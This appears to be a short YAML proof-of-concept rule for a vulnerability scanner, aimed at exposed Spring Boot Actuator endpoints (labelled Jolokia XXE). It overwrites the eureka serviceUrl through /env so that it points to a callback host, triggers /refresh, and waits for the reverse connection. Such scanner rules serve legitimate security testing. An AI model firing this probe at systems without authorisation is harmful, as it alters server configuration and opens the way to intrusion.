name: poc-yaml-jolokia-xxe
rules:
  - method: POST
    path: /env
    body: 'eureka.client.serviceUrl.defaultZone={{reverse_url}}'
    follow_redirects: true
    expression: >
      status==200 &&  body.bcontains(b"eureka.client.serviceUrl.defaultZone")
  - method: POST
    path: /refresh
    body: ''
    follow_redirects: true
    expression: >
      status==200 && waitReverse(5)
detail:
  author: loneyer
  links:
    - https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
    - https://github.com/Loneyers/vuldocker/tree/master/jolokia-xxe
